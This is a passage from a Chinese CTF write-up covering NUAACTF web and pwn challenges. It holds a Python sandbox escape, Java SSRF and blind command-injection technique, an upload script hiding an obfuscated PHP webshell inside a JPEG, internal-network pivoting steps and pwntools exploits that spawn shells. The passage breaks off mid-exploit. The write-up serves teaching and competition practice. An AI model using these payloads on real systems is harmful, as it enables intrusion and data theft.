class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python2.7/dist-packages/flask/app.pyc&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2485378285570&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> get_pin(md5_list)</span><br></pre></td></tr></table></figure>



<p>这里可能比较坑的是<code>/usr/local/lib/python2.7/dist-packages/flask/app.pyc</code>跟<code>machine_id</code>是空两处。不过通过几次尝试也都可以尝试出来。难度并不算大。</p>
<p>然后就是命令执行，一个简单没有任何过滤的<code>Python</code>沙盒，方法很多。</p>
<p>这里简单给个事例</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[console ready]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span> )</span><br><span class="line"><span class="string">&#x27;APP\nflag\nrun.py\ntest.py\nwww.zip\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat ./flag&quot;).read()&#x27;</span> )</span><br><span class="line"><span class="string">&#x27;NUAACTF&#123;F14sssskkkrrr_D3Bug_n0t_S4f3&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi9o8be0bj227616s7hc.jpg"></p>
<h3 id="Web3-张哥的金牌之旅"><a href="#Web3-张哥的金牌之旅" class="headerlink" title="Web3    张哥的金牌之旅"></a>Web3    张哥的金牌之旅</h3><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ctf.asuri.org:8003&#x2F;</span><br><span class="line"></span><br><span class="line">做完A+B你就可以拿金牌了。（你可能需要一个逆向哥哥来帮你</span><br><span class="line"></span><br><span class="line">小水管服务器，为了顺畅做题请大家不要用扫描器，而且这题用不到扫描器！！！</span><br><span class="line"></span><br><span class="line">flag格式为NUAACTF&#123;.*&#125;</span><br></pre></td></tr></table></figure>

<h4 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h4><p>打开发现是个<code>java</code>框架。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyia0yt2bij228017s47p.jpg"></p>
<p>提供了简单的登录注册。</p>
<p>然后发现只有<code>A+B</code>问题可以点</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyiauiinyrj227w180jx9.jpg"></p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyiaul3dphj228017ogqx.jpg"></p>
<p>代码提交页面提供代码提交，查看最后一次提交的代码功能。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyiaw8k1jjj2280180jwx.jpg"></p>
<p>引用代码提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请以代码文件为url，例如http:&#x2F;&#x2F;mysite.com&#x2F;main.c，仅支持c,cpp,java,py,js,cs的提交</span><br></pre></td></tr></table></figure>

<p>然后提交一个<code>https://raw.githubusercontent.com/php/php-src/master/ext/zlib/zlib.c</code>，发现返回代码过多，再找个几行代码的<code>https://gitee.com/CheungSSH_OSC/CheungSSH/raw/master/bin/DataConf.py</code></p>
<p>返回提示成功，查看上一次提交代码，发现以源码方式返回。还有个下载代码的功能，得到一个文件名为用户名经过md5后的<code>txt</code>文件。</p>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>既然引用代码处，可以引用<code>http</code>协议的<code>url</code>，那我们可以试试用<code>file</code>如何。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyibr7mtsvj21yo13444v.jpg"></p>
<p>发现是<code>forbidden</code>，通过<code>fuzz</code>我们可以得到<code>jar netdoc</code>两个<code>java SSRF</code>支持的协议没有被<code>ban</code>，而且需要再最后加入<code>?1.c</code>来绕过后缀检测</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyibz19mwyj21yu18qwmv.jpg"></p>
<p>然后查看最后一次代码提交，发现并没有什么改变。</p>
<p>试试<code>netdoc</code>，传入<code>netdoc:///?1.c</code></p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidhkjy5wj21z218sguq.jpg"></p>
<p>发现可以得到回显</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidhhna5tj21ys18gww2.jpg"></p>
<p>但是直接请求<code>flag</code>，发现被<code>ban</code>掉了，所以我们得另寻他路。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidkqxytej21yu190k01.jpg"></p>
<h4 id="突破口"><a href="#突破口" class="headerlink" title="突破口"></a>突破口</h4><p>通过查看一系列文件，发现如果直接读<code>class</code>文件的话，直接展示出来了<code>class</code>二进制文件，那我们下载下来会不会也是<code>class</code>文件的形式呢</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidsve7dlj21yq0v0n5d.jpg"></p>
<p>下载下来后，我们用<code>file</code>看一下，果然是个<code>java class</code>文件</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidsyg0uaj2102038adb.jpg"></p>
<p>用<code>JD-GUI</code>打开得到源码</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidw0hu30j228018kdpv.jpg"></p>
<p>题目描述说需要逆向师傅其实指的就是这里需要逆向<code>class</code>文件，（其实也不需要…直接用<code>JD-GUI</code>直接就能看了…</p>
<p>这里省略了其他源码的审计。</p>
<p>然后看到貌似多出的这个<code>User.class</code>类，然后发现了比较敏感的<code>readObject()</code>函数，<code>java</code>反序列化漏洞特征，可能存在<code>java</code>反序列化漏洞</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidyds8e7j227w18uk1b.jpg"></p>
<p>然后找到其利用的地方，发现在<code>netdoc:///app/webapps/ROOT/WEB-INF/classes/org/nuaa/tomax/logindemo/controller/UserController.class</code>调用了<code>User</code>类。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyie2v8gsnj2280196qfm.jpg"></p>
<p><code>UserController.class</code>的关键部分:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&#123;&quot;/record&quot;&#125;)</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">record</span><span class="params">(<span class="keyword">long</span> userId, HttpSession session, String cmd)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Timestamp timestamp = <span class="keyword">new</span> Timestamp(System.currentTimeMillis());</span><br><span class="line">    UserEntity user = (UserEntity)session.getAttribute(<span class="string">&quot;user_&quot;</span> + userId);</span><br><span class="line">    <span class="keyword">if</span> (cmd != <span class="keyword">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      User mUsr = <span class="keyword">new</span> User(user.getId(), user.getUsername(), cmd, timestamp);</span><br><span class="line">      SysUtil.recordCmd(mUsr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>在看到<code>SysUtil.class</code>:</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyieei3nmoj2280192tlm.jpg"></p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyieefah7pj227y18qgwt.jpg"></p>
<p>发现竟然有部分貌似真的需要逆向，但是其实仔细往下看，利用点跟上面那段代码没太大关系。</p>
<p>看到<code>recordCmd()</code>，可以说是非常标准的<code>java</code>反序列化的代码了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">recordCmd</span><span class="params">(User user)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">    ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">    </span><br><span class="line">    os.writeObject(user);</span><br><span class="line">    os.close();</span><br><span class="line">    </span><br><span class="line">    FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">    </span><br><span class="line">    User outUsr = (User)ois.readObject();</span><br><span class="line">    ois.close();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>接着我们回到<code>User.class</code>，很明显，这里可以控制传入<code>cmd</code>，我们再看看<code>User.class</code>的关键代码:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] BLACKLIST = &#123; <span class="string">&quot;$&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;||&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;rm&quot;</span>, <span class="string">&quot;echo&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(<span class="keyword">long</span> id, String username, String cmd, Timestamp time)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.id = id;</span><br><span class="line">    <span class="keyword">this</span>.username = username;</span><br><span class="line">    <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">    <span class="keyword">this</span>.time = time;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    in.defaultReadObject();</span><br><span class="line">    <span class="keyword">if</span> (checkCmd(<span class="keyword">this</span>.cmd).booleanValue())</span><br><span class="line">    &#123;</span><br><span class="line">      String cmd_pre = <span class="string">&quot;sleep $(&quot;</span>;</span><br><span class="line">      String cmd_suf = <span class="string">&quot;)&quot;</span>;</span><br><span class="line">      String exec = cmd_pre + <span class="keyword">this</span>.cmd + cmd_suf;</span><br><span class="line"></span><br><span class="line">      String[] cmds = &#123; SysUtil.asciiToString(<span class="string">&quot;47,98,105,110,47,98,97,115,104&quot;</span>), SysUtil.asciiToString(<span class="string">&quot;45,99&quot;</span>), exec &#125;;</span><br><span class="line">      SysUtil.execCmd(cmds);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Boolean <span class="title">checkCmd</span><span class="params">(String cmd)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">for</span> (String symbol : BLACKLIST) &#123;</span><br><span class="line">          <span class="keyword">if</span> (cmd.contains(symbol)) &#123;</span><br><span class="line">              <span class="keyword">return</span> Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> Boolean.valueOf(<span class="keyword">true</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><code>cmds</code>转换为<code>ascii</code>就是</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] cmds = &#123; <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, exec &#125;;</span><br></pre></td></tr></table></figure>

<p><code>exec</code>就是传入的<code>cmd</code>，然而这里利用点比较尴尬，因为我们传入的代码是被<code>exec</code>是被<code>sleep $()</code>给包围起来的，而关键的一些绕过都进了黑名单</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] BLACKLIST = &#123; <span class="string">&quot;$&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;||&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;rm&quot;</span>, <span class="string">&quot;echo&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>这里我们可以使用命令执行盲注的形式进行对<code>flag</code>猜解。稍后我会详细写一篇文章讲解命令盲注的方式。</p>
<p>我们可以采用<code>cat /flag | cut -c 1 | tr N 10</code>这样的形式对<code>flag</code>进行猜解。</p>
<ul>
<li><code>cat /flag</code>读取<code>/flag</code>中的内容</li>
<li><code>cut -c 1</code>截取第一个字符</li>
<li><code>tr N 10</code>用<code>10</code>来代替<code>flag</code>中的字母<code>N</code></li>
</ul>
<p>所以，通过把<code>flag</code>中的内容读出来之后，用字母代替进行<code>sleep</code>，如果猜解对的话，并且排除网络原因，页面会延缓<code>5s</code>才返回，所以我们可以利用这个特性把<code>flag</code>猜解出来。</p>
<p>其实这里设置得不太好，应该把<code>flag</code>改成全英文比较好一些得到<code>flag</code>。也可以用<code>burp intruder</code>来猜解。</p>
<h3 id="Web4-Pentest"><a href="#Web4-Pentest" class="headerlink" title="Web4 Pentest"></a>Web4 Pentest</h3><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I love Pentest!</span><br><span class="line"></span><br><span class="line">做出来的师傅请不要搅屎。 http:&#x2F;&#x2F;ctf.asuri.org:8004</span><br></pre></td></tr></table></figure>

<h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p>首先通过扫目录扫出上传页面，然后利用上传处理的错误逻辑，上传带一句话的图片(图片会经过gd库解析)，解析出错不会删除上传的文件（可以在 index 页面看到）， 然后文件包含拿 shell, 得到 web 目录下的 Import_notes 文件，知道需要打登录内网 samba 拿 flag, 于是代理进内网。由于用了 disable_function , 通过下面的文章进行绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;192052.html</span><br></pre></td></tr></table></figure>

<p>samba 共享里面有一半 flag , 还需要利用漏洞打内网的另外一台 tomcat ,拿到 shell ， 读取第二部分的 flag</p>
<p>具体利用步骤<br>通过扫目录扫到 <code>upload.php</code> , 可以上传图片，上传后会用 gd 对图片进行二次渲染， 由于代码逻辑不当，当渲染失败时图片依然会保存在服务器上，可以通过 <code>index.php</code> 看到引用的 <code>url</code>.</p>
<p>然后上传文件</p>
<p><img src="https://ws1.sinaimg.cn/large/006daSSqgy1fy8sxqzmwjj31ea0hx78u.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line">paramsPost &#x3D; &#123;&quot;submit&quot;: &quot;\xe4\xb8\x8a\xe4\xbc\xa0&quot;&#125;</span><br><span class="line">paramsMultipart &#x3D; [(&#39;upload_file&#39;, (&#39;hac425.jpg&#39;, &quot;\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00\x00\x00\x00\x00\x00\xff\xe10\xcaExif\x00\x00MM\x00*\x00\x00\x00\x08\x00\x04\x011\x00\x02\x00\x00\x00\x0b\x00\x00\x10J\x87i\x00\x04\x00\x00\x00\x01\x00\x00\x10V\x88%\x00\x04\x00\x00\x00\x01\x00\x00 \xa2\xea\x1c\x00\x07\x00\x00\x10\x0c\x00\x00\x00&gt;\x00\x00\x00\x00\x1c\xea\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&lt;?php \x24VsLC&#x3D;create_function(str_rot13(&#39;\x24&#39;).chr(96600&#x2F;840).str_rot13(&#39;b&#39;).str_rot13(&#39;z&#39;).chr(0346-0201),base64_decode(&#39;ZQ&#x3D;&#x3D;&#39;).base64_decode(&#39;dg&#x3D;&#x3D;&#39;).base64_decode(&#39;YQ&#x3D;&#x3D;&#39;).chr(0247370&#x2F;01432).str_rot13(&#39;(&#39;).chr(0x6204&#x2F;0x2b9).base64_decode(&#39;cw&#x3D;&#x3D;&#39;).base64_decode(&#39;bw&#x3D;&#x3D;&#39;).base64_decode(&#39;bQ&#x3D;&#x3D;&#39;).base64_decode(&#39;ZQ&#x3D;&#x3D;&#39;).chr(0x13f-0x116).chr(0x397-0x35c));\x24VsLC(base64_decode(&#39;NDE3N&#39;.&#39;jc4O0&#39;.&#39;BldkF&#39;.&#39;sKCRf&#39;.&#39;&#39;.chr(0x3dc-0x387).str_rot13(&#39;R&#39;).chr(423-366).chr(0204170&#x2F;01446).base64_decode(&#39;Vg&#x3D;&#x3D;&#39;).&#39;&#39;.&#39;&#39;.chr(01157-01051).chr(0x10ca2&#x2F;0x256).str_rot13(&#39;k&#39;).chr(0x217-0x1bf).chr(0x5fa5&#x2F;0x127).&#39;&#39;.&#39;k7MTI&#39;.&#39;1MzAz&#39;.&#39;NDs&#x3D;&#39;.&#39;&#39;));?&gt;&quot;, &#39;image&#x2F;jpeg&#39;))]</span><br><span class="line">response &#x3D; session.post(&quot;http:&#x2F;&#x2F;192.168.245.142:6655&#x2F;upload.php&quot;,</span><br><span class="line">                        data&#x3D;paramsPost, files&#x3D;paramsMultipart)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>然后在利用 文件包含漏洞拿 shell, 拿到 shell 之后会发现一个重要的文件</p>
<p><img src="https://ws1.sinaimg.cn/large/006daSSqgy1fy8syh9uwzj30se0i4gmx.jpg"></p>
<p>文件里面有 <code>samba</code> 的账号密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">机智的我把重要文件都丢内网 samba了， 这里备忘个账户&#x2F;密码： hac425&#x2F;123456</span><br></pre></td></tr></table></figure>



<p>通过这个文件知道 flag 应该在内网的 samba 服务器， 于是上传 busybox+reGeorg ,分别用于查看 ip 和代理。</p>
<p>通过扫描可以知道开启 samba 的机器，然后密码登录拿 flag. 获得提示去扫描其他常见的服务， 80,8080 等，可以找到 tomcat , 于是此时可以尝试利用漏洞打。</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>简单栈溢出，用了随机数模拟了canary，本地生成随机数即可。</p>
<p>Exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./overflow&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x80485BD</span></span><br><span class="line">t = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(t)</span><br><span class="line">random = libc.rand()</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + p32(random) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0xc</span> + p32(ret)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p.recvline()</span><br></pre></td></tr></table></figure>



<h3 id="kvm"><a href="#kvm" class="headerlink" title="kvm"></a>kvm</h3><p>简单的kvm，只需要在vm里面执行端口写操作即可。</p>
<p>Exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./kvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;execute: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	movabs rax, 0x67616c66</span></span><br><span class="line"><span class="string">  	push 4</span></span><br><span class="line"><span class="string">  	pop rcx</span></span><br><span class="line"><span class="string">  	mov edx, 0x100</span></span><br><span class="line"><span class="string">  OUT:</span></span><br><span class="line"><span class="string">  	out dx, al</span></span><br><span class="line"><span class="string">  	shr rax, 8</span></span><br><span class="line"><span class="string">  	loop OUT</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;execute again: \n&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(asm(shellcraft.amd64.linux.sh(), arch = <span class="string">&#x27;amd64&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="password-checker"><a href="#password-checker" class="headerlink" title="password_checker"></a>password_checker</h3><p><code>snprintf</code> 误用， 它返回的是格式化解析后形成的字符串的长度（及期望写入目标缓冲区的长度），而不是实际写入 目标缓冲区的内存长度。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int off &#x3D; snprintf(buf, 0x100, &quot;name:%s&amp;&quot;, input);</span><br><span class="line">...........................</span><br><span class="line">...........................    </span><br><span class="line">...........................</span><br><span class="line">&#x2F;&#x2F; off 可能会比较大，出现越界写</span><br><span class="line">off &#x3D; snprintf(buf + off, 0x100 - off, &quot;pwd:%s&quot;, input);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以利用 <code>snprintf</code> 让 off 移动到返回地址的位置， 然后写返回地址为 getshell 函数的地址。</p>
<p>具体看 <code>exp</code> 和源码</p>
<p>Exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">binary_path = <span class="string">&quot;../dist/pwn&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(binary_path)</span></span><br><span class="line">p = remote(<span class="string">&quot;172.17.0.2&quot;</span>, <span class="number">20000</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;welcome.....&quot;</span>)</span><br><span class="line"><span class="comment"># 计算出需要输入的字符串长度，让 off + 